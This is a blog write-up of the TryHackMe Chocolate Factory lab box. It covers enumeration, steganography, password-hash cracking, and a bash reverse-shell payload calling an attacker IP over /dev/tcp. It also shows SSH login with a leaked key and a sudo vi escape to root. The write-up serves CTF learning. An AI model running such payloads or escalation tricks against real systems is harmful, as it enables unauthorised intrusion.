<!DOCTYPE html>
<html lang="en-us" dir="ltr">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='THM Chocolate Factory box writeup'>
<title>Charlie and the Chocolate Factory</title>

<link rel='canonical' href='https://sudo-echo-jin.github.io/p/chocolate/'>

<link rel="stylesheet" href="/scss/style.min.8191399262444ab68b72a18c97392f5349be20a1615d77445be51e974c144cff.css"><meta property='og:title' content='Charlie and the Chocolate Factory'>
<meta property='og:description' content='THM Chocolate Factory box writeup'>
<meta property='og:url' content='https://sudo-echo-jin.github.io/p/chocolate/'>
<meta property='og:site_name' content='Jin&#39;s Exploit Repo'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='easy' /><meta property='article:tag' content='steganography' /><meta property='article:tag' content='ident' /><meta property='article:published_time' content='2022-12-25T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-12-25T00:00:00&#43;00:00'/><meta property='og:image' content='https://sudo-echo-jin.github.io/p/chocolate/cover.png' />
<meta name="twitter:title" content="Charlie and the Chocolate Factory">
<meta name="twitter:description" content="THM Chocolate Factory box writeup"><meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content='https://sudo-echo-jin.github.io/p/chocolate/cover.png' />
    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/profile_hu57ae8b53bdad88fe9264e8a6db5fab4f_222163_300x0_resize_q75_box.jpg" width="300"
                            height="169" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
                    <span class="emoji">üç•</span>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">Jin&#39;s Exploit Repo</a></h1>
            <h2 class="site-description">Explore fun stuffs here</h2>
        </div>
    </header><ol class="menu" id="main-menu">
        
        
        

        <li >
            <a href='/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>Home</span>
            </a>
        </li>
        
        

        <li >
            <a href='/archives/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>Archives</span>
            </a>
        </li>
        
        

        <li >
            <a href='/search/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>Search</span>
            </a>
        </li>
        
        

        <li >
            <a href='/links/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
</svg>



                
                <span>Links</span>
            </a>
        </li>
        

        <div class="menu-bottom-section">
            
            
                <li id="dark-mode-toggle">
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="8" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="16" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                    <span>Dark Mode</span>
                </li>
            
        </div>
    </ol>
</aside>

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">Table of contents</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li><a href="#enumeration">Enumeration</a></li>
    <li><a href="#ident">IDENT</a></li>
    <li><a href="#ftp">FTP</a></li>
    <li><a href="#http">HTTP</a></li>
    <li><a href="#foothold--user-flag">Foothold &amp; User flag</a></li>
    <li><a href="#lateral-movement">Lateral Movement</a></li>
    <li><a href="#privesc--root-flag">Privesc &amp; Root flag</a></li>
  </ol>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="has-image main-article">
    <header class="article-header">
        <div class="article-image">
            <a href="/p/chocolate/">
                <img src="/p/chocolate/cover.png"
                        
                        width="776" 
                        height="899" 
                        loading="lazy"
                        alt="Featured image of post Charlie and the Chocolate Factory" />
                
            </a>
        </div>
    

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/box/" style="background-color: #2a9d8f; color: #fff;">
                Box
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/p/chocolate/">Charlie and the Chocolate Factory</a>
        </h2>
    
        
        <h3 class="article-subtitle">
            THM Chocolate Factory box writeup
        </h3>
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">Dec 25, 2022</time>
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    4 minute read
                </time>
            </div>
        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <p>I enjoyed watching this movie when I was a kid. This box is made with the theme from the movie <em>Charlie and the Chocolate Factory</em>. Thanks to <a class="link" href="https://andyinfosec.com/"  target="_blank" rel="noopener"
    >AndyInfosec</a> team for creating this fun box and reminding me of a good old memories.</p>
<p>Now it&rsquo;s time to take over the chocolate factory :)</p>
<h2 id="enumeration">Enumeration</h2>
<p>Target IP: 10.10.255.29</p>
<p>Starting with the port scanning.</p>
<p><img src="/p/chocolate/a1.png"
	width="714"
	height="511"
	
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="139"
		data-flex-basis="335px"
	
></p>
<h2 id="ident">IDENT</h2>
<p>We see many ports opened, and one of them, 113, runs &ldquo;ident&rdquo; protocol.</p>
<p><a class="link" href="https://www.warmupinbox.com/ident-protocol"  target="_blank" rel="noopener"
    >What is ident?</a></p>
<p>Modern day routers, even the cheap ones, they all contain the functionality to block this port. This port should not be allowed to people in general.</p>
<p>Let&rsquo;s see what information we can retrieve.</p>
<p><img src="/p/chocolate/a2.png"
	width="650"
	height="134"
	
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="485"
		data-flex-basis="1164px"
	
></p>
<p>From the nmap scan, we know that the target is running web server, so this might be useful later on when investigating the web.</p>
<p>Lets check other ports as well.</p>
<p><img src="/p/chocolate/a3.png"
	width="679"
	height="340"
	
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="199"
		data-flex-basis="479px"
	
></p>
<p>This is what we got from the port 100. For those of you who forgot the characters in the movie, Mr. Wonka, or Willy Wonka, is the owner of the chocolate factory and Augustus is this <a class="link" href="https://www.youtube.com/watch?v=lzmzZaB0kss"  target="_blank" rel="noopener"
    >boy</a>. All the other ports above 100 returns this message except the port 125.</p>
<h2 id="ftp">FTP</h2>
<p>Let&rsquo;s see if this server allows anonymous access.</p>
<p><img src="/p/chocolate/a5.png"
	width="407"
	height="255"
	
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="159"
		data-flex-basis="383px"
	
></p>
<p>Yes it does.</p>
<p>List the content and download.</p>
<p><img src="/p/chocolate/a6.png"
	width="927"
	height="290"
	
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="319"
		data-flex-basis="767px"
	
></p>
<p>There is a file called gum_room.jpg.</p>
<p><a class="link" href="https://www.youtube.com/watch?v=FcqZynKuqhI"  target="_blank" rel="noopener"
    >Gum room</a>
<img src="/p/chocolate/gum_room.jpg"
	width="1920"
	height="1080"
	
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="177"
		data-flex-basis="426px"
	
></p>
<p>And this is the photo.</p>
<p>Investigate if anything is hidden in this jpg file.</p>
<ul>
<li>binwalk</li>
<li>strings</li>
<li>stegseek</li>
</ul>
<p>We got something from the stegseek.</p>
<p><img src="/p/chocolate/a7.png"
	width="662"
	height="177"
	
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="374"
		data-flex-basis="897px"
	
></p>
<p>Check out the content.</p>
<p><img src="/p/chocolate/a8.png"
	width="793"
	height="746"
	
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="106"
		data-flex-basis="255px"
	
></p>
<p>We got a base64 string. Run the following command below.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"> cat gum_room.jpg.out <span class="p">|</span> base64 -d &gt; decrypted.txt
</span></span></code></pre></td></tr></table>
</div>
</div><p>And we got a shadow file that contains the Charlie&rsquo;s password in sha512crypt hash.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">--SNIPP--
</span></span><span class="line"><span class="cl">charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:18535:0:99999:7:::
</span></span></code></pre></td></tr></table>
</div>
</div><p>John comes into play. We don&rsquo;t need to specify the format becaus JTR automatically recognizes it as sha512crypt.</p>
<p>Save the charlie&rsquo;s shadow info in the file named <em>hash</em>.</p>
<p><img src="/p/chocolate/a9.png"
	width="950"
	height="106"
	
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="896"
		data-flex-basis="2150px"
	
></p>
<p>Now we can bruteforce.</p>
<p><img src="/p/chocolate/b1.png"
	width="935"
	height="268"
	
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="348"
		data-flex-basis="837px"
	
></p>
<p>We got charlie&rsquo;s password.</p>
<h2 id="http">HTTP</h2>
<p>Open the web browser and check the website.</p>
<p><img src="/p/chocolate/a4.png"
	width="794"
	height="697"
	
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="113"
		data-flex-basis="273px"
	
></p>
<p>We got a web page with the login form.</p>
<p>Let&rsquo;s check what we got from IDENT port. (http://localhost/key_rev_key)</p>
<p>In the web browser, type <code>http://10.10.255.29/key_rev_key</code> and we get a file called <em>key_rev_key</em>.</p>
<p><img src="/p/chocolate/b2.png"
	width="311"
	height="212"
	
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="146"
		data-flex-basis="352px"
	
></p>
<p>It is a ELF 64-bit file. Let&rsquo;s run it.</p>
<p><img src="/p/chocolate/b3.png"
	width="303"
	height="102"
	
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="297"
		data-flex-basis="712px"
	
></p>
<p>It doesn&rsquo;t like my name.</p>
<p>Let&rsquo;s do simple investigation on what libraries and functions this executable is calling.</p>
<p><img src="/p/chocolate/b4.png"
	width="751"
	height="215"
	
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="349"
		data-flex-basis="838px"
	
></p>
<p>Looks like this program is written in C and calls &ldquo;printf&rdquo;, &ldquo;scanf&rdquo;, &ldquo;puts&rdquo;, and &ldquo;strcmp&rdquo;.</p>
<p>It also leaks the string value that my name is being compared to. <em>laksdhfas</em>.</p>
<p>Let&rsquo;s rerun it with the name <em>laksdhfas</em>.</p>
<p><img src="/p/chocolate/b5.png"
	width="921"
	height="140"
	
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="657"
		data-flex-basis="1578px"
	
></p>
<p>We got a key, but don&rsquo;t know yet where it&rsquo;s gonna be used.</p>
<h2 id="foothold--user-flag">Foothold &amp; User flag</h2>
<p>&ldquo;While I was writing this post, machine time expired, so I restarted a machine and got new target IP: 10.10.124.206&rdquo;</p>
<p>We have charlie&rsquo;s password from the FTP section. Let&rsquo;s login.</p>
<p>Since the credential came from the shadow file, I thought it is obviously the ssh credential, but wasn&rsquo;t true. One more place we could use this is the login form in the web.</p>
<p><img src="/p/chocolate/b6.png"
	width="611"
	height="551"
	
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="110"
		data-flex-basis="266px"
	
></p>
<p><img src="/p/chocolate/b7.png"
	width="1880"
	height="988"
	
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="190"
		data-flex-basis="456px"
	
></p>
<p>Login was successful and we are now in the <a class="link" href="https://www.youtube.com/watch?v=dlkSbQ-IkRM"  target="_blank" rel="noopener"
    >squirrel room</a>. This room let us execute commands.</p>
<p>Setup a listener</p>
<p><img src="/p/chocolate/b8.png"
	width="423"
	height="97"
	
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="436"
		data-flex-basis="1046px"
	
></p>
<p>Payload</p>
<blockquote>
<p>/bin/bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.2.19.132/7777 0&gt;&amp;1&quot;</p>
</blockquote>
<p><img src="/p/chocolate/b9.png"
	width="362"
	height="141"
	
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="256"
		data-flex-basis="616px"
	
></p>
<p>Execute it.</p>
<p><img src="/p/chocolate/c1.png"
	width="816"
	height="332"
	
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="245"
		data-flex-basis="589px"
	
></p>
<p>And we are in.</p>
<h2 id="lateral-movement">Lateral Movement</h2>
<p>Navigate to user charlie&rsquo;s home directory and we see some interesting files.</p>
<p><img src="/p/chocolate/c2.png"
	width="655"
	height="185"
	
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="354"
		data-flex-basis="849px"
	
></p>
<p><img src="/p/chocolate/c3.png"
	width="949"
	height="197"
	
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="481"
		data-flex-basis="1156px"
	
></p>
<p>The content of teleport.pub</p>
<p><img src="/p/chocolate/c4.png"
	width="687"
	height="611"
	
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="112"
		data-flex-basis="269px"
	
></p>
<p>The content of teleport</p>
<p>This is the ssh private key with the weak permission set.</p>
<p>Let&rsquo;s login to charlie&rsquo;s account using this private key. Copy the key into a file named &lsquo;id_rsa&rsquo; and give it a 600 permission.</p>
<p><img src="/p/chocolate/c5.png"
	width="688"
	height="685"
	
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="100"
		data-flex-basis="241px"
	
></p>
<blockquote>
<p>ssh -i id_rsa charlie@10.10.124.206</p>
</blockquote>
<p><img src="/p/chocolate/c6.png"
	width="948"
	height="894"
	
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="106"
		data-flex-basis="254px"
	
></p>
<p>We are now charlie.</p>
<p><img src="/p/chocolate/d5.png"
	width="671"
	height="53"
	
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="1266"
		data-flex-basis="3038px"
	
></p>
<p>We got a user flag.</p>
<h2 id="privesc--root-flag">Privesc &amp; Root flag</h2>
<p>Let&rsquo;s first check if charlie has any sudo privilege.</p>
<p><img src="/p/chocolate/c7.png"
	width="943"
	height="179"
	
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="526"
		data-flex-basis="1264px"
	
></p>
<p>This is going to be really simple privesc. We can run vi editor in root&rsquo;s privilege without charlie&rsquo;s password (good thing because we don&rsquo;t know charlie&rsquo;s password).</p>
<p>Execute <code>sudo /usr/bin/vi</code></p>
<p><img src="/p/chocolate/c8.png"
	width="493"
	height="55"
	
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="896"
		data-flex-basis="2151px"
	
></p>
<p><img src="/p/chocolate/c9.png"
	width="959"
	height="546"
	
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="175"
		data-flex-basis="421px"
	
></p>
<p>And we are now in a default vi editor.</p>
<p>Type <code>:!bash</code></p>
<p><img src="/p/chocolate/d1.png"
	width="555"
	height="424"
	
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="130"
		data-flex-basis="314px"
	
></p>
<p>Enter</p>
<p><img src="/p/chocolate/d2.png"
	width="565"
	height="144"
	
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="392"
		data-flex-basis="941px"
	
></p>
<p>We got root shell.</p>
<p>Navigate to the root&rsquo;s home directory and instead of a flag, we see a python script called root.py.</p>
<p><img src="/p/chocolate/d3.png"
	width="368"
	height="53"
	
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="694"
		data-flex-basis="1666px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">cryptography.fernet</span> <span class="kn">import</span> <span class="n">Fernet</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pyfiglet</span>
</span></span><span class="line"><span class="cl"><span class="n">key</span><span class="o">=</span><span class="nb">input</span><span class="p">(</span><span class="s2">&#34;Enter the key:  &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">f</span><span class="o">=</span><span class="n">Fernet</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">encrypted_mess</span><span class="o">=</span> <span class="s1">&#39;gAAAAABfdb52eejIlEaE9ttPY8ckMMfHTIw5lamAWMy8yEdGPhnm9_H_yQikhR-bPy09-NVQn8lF_PDXyTo-T7CpmrFfoVRWzlm0OffAsUM7KIO_xbIQkQojwf_unpPAAKyJQDHNvQaJ&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">dcrypt_mess</span><span class="o">=</span><span class="n">f</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">encrypted_mess</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">mess</span><span class="o">=</span><span class="n">dcrypt_mess</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">display1</span><span class="o">=</span><span class="n">pyfiglet</span><span class="o">.</span><span class="n">figlet_format</span><span class="p">(</span><span class="s2">&#34;You Are Now The Owner Of &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">display2</span><span class="o">=</span><span class="n">pyfiglet</span><span class="o">.</span><span class="n">figlet_format</span><span class="p">(</span><span class="s2">&#34;Chocolate Factory &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">display1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">display2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">mess</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The content of <em>root.py</em></p>
<p>We already have a key from the binary key_rev_key.</p>
<blockquote>
<p>b&rsquo;-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=&rsquo;</p>
</blockquote>
<p>So, we can fix this code since that way, it&rsquo;s easier to pass the byte string to the <code>key</code> variable. Also, the original code yields some errors.</p>
<p>Modified code:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">cryptography.fernet</span> <span class="kn">import</span> <span class="n">Fernet</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pyfiglet</span>
</span></span><span class="line"><span class="cl"><span class="c1">#key=input(&#34;Enter the key:  &#34;) &lt;&lt; change this</span>
</span></span><span class="line"><span class="cl"><span class="n">key</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=&#39;</span> <span class="c1"># to this</span>
</span></span><span class="line"><span class="cl"><span class="n">f</span><span class="o">=</span><span class="n">Fernet</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">encrypted_mess</span><span class="o">=</span> <span class="s1">&#39;gAAAAABfdb52eejIlEaE9ttPY8ckMMfHTIw5lamAWMy8yEdGPhnm9_H_yQikhR-bPy09-NVQn8lF_PDXyTo-T7CpmrFfoVRWzlm0OffAsUM7KIO_xbIQkQojwf_unpPAAKyJQDHNvQaJ&#39;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#dcrypt_mess=f.decrypt(encrypted_mess) &lt;&lt; change this</span>
</span></span><span class="line"><span class="cl"><span class="n">dcrypt_mess</span><span class="o">=</span><span class="n">f</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">encrypted_mess</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span> <span class="c1"># to this. f.decrypt(token) &lt;&lt; token has to be in byte format</span>
</span></span><span class="line"><span class="cl"><span class="n">mess</span><span class="o">=</span><span class="n">dcrypt_mess</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">display1</span><span class="o">=</span><span class="n">pyfiglet</span><span class="o">.</span><span class="n">figlet_format</span><span class="p">(</span><span class="s2">&#34;You Are Now The Owner Of &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">display2</span><span class="o">=</span><span class="n">pyfiglet</span><span class="o">.</span><span class="n">figlet_format</span><span class="p">(</span><span class="s2">&#34;Chocolate Factory &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">display1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">display2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">mess</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Run root.py</p>
<p><img src="/p/chocolate/d4.png"
	width="832"
	height="701"
	
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="118"
		data-flex-basis="284px"
	
></p>
<p><em>You are now the owner of chocolate factory</em></p>
<p>And we got a root flag.</p>
<p>Chocolate Factory pwned.</p>

</section>


    <footer class="article-footer">
    
    <section class="article-tags">
        
            <a href="/tags/easy/">easy</a>
        
            <a href="/tags/steganography/">steganography</a>
        
            <a href="/tags/ident/">ident</a>
        
    </section>


    
    <section class="article-copyright">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
</svg>



        <span>Licensed under CC BY-NC-SA 4.0</span>
    </section>
    </footer>


    
</article>

    

    

<aside class="related-content--wrapper">
    <h2 class="section-title">Related content</h2>
    <div class="related-content">
        <div class="flex article-list--tile">
            
                
<article class="has-image">
    <a href="/p/precious/">
        
        
            <div class="article-image">
                <img src="/p/precious/precious.935725fc0c2cebea65f1eb6475a7a9ce.jpg" 
                        width="1920" 
                        height="1280" 
                        loading="lazy"
                        alt="Featured image of post Precious"
                        data-key="precious" 
                        data-hash="md5-k1cl/Aws6&#43;pl8etkdaepzg==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">Precious</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/squashed/">
        
        
            <div class="article-image">
                <img src="/p/squashed/sq.b411f6f183998cc1332a5f43dbd1ea0b.jpg" 
                        width="1920" 
                        height="1280" 
                        loading="lazy"
                        alt="Featured image of post Squashed"
                        data-key="squashed" 
                        data-hash="md5-tBH28YOZjMEzKl9D29HqCw==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">Squashed</h2>
        </div>
    </a>
</article>

            
        </div>
    </div>
</aside>

     
    
        
    <div class="disqus-container">
    <div id="disqus_thread"></div>
<script type="application/javascript">
    window.disqus_config = function () {
    
    
    
    };
    (function() {
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
            return;
        }
        var d = document, s = d.createElement('script'); s.async = true;
        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
</div>

<style>
    .disqus-container {
        background-color: var(--card-background);
        border-radius: var(--card-border-radius);
        box-shadow: var(--shadow-l1);
        padding: var(--card-padding);
    }
</style>

<script>
    window.addEventListener('onColorSchemeChange', (e) => {
        if (typeof DISQUS == 'object') {
            DISQUS.reset({
                reload: true
            });
        }
    })
</script>

    

